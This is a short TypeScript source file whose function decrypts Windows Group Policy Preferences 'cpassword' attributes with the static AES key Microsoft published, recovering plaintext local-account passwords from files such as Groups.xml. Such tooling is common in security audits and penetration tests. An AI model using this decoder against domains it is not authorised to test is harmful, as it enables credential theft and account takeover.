// Group Policy Preferences stored local-account passwords AES-256-CBC
// encrypted in Groups.xml/ScheduledTasks.xml etc — but Microsoft published
// the static key in MS14-025, so any "cpassword" attribute decrypts
// instantly with no target interaction. Verified against gpp-decrypt's
// own real encrypted/plaintext pair.
const GPP_KEY_BYTES = new Uint8Array([
  0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10,
  0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
  0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
]);

function base64UrlToBytes(value: string) {
  const padded = value.replace(/-/g, "+").replace(/_/g, "/")
    + "=".repeat((4 - (value.length % 4)) % 4);
  const binary = atob(padded);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) bytes[i] = binary.charCodeAt(i);
  return bytes;
}

export async function decodeGppCpassword(cpassword: string): Promise<string | undefined> {
  const value = cpassword.trim();
  if (!value) return undefined;
  try {
    const ciphertext = base64UrlToBytes(value);
    const key = await crypto.subtle.importKey(
      "raw", GPP_KEY_BYTES, { name: "AES-CBC" }, false, ["decrypt"],
    );
    const plain = await crypto.subtle.decrypt(
      { name: "AES-CBC", iv: new Uint8Array(16) }, key, ciphertext,
    );
    return new TextDecoder("utf-16le").decode(plain);
  } catch {
    return undefined;
  }
}
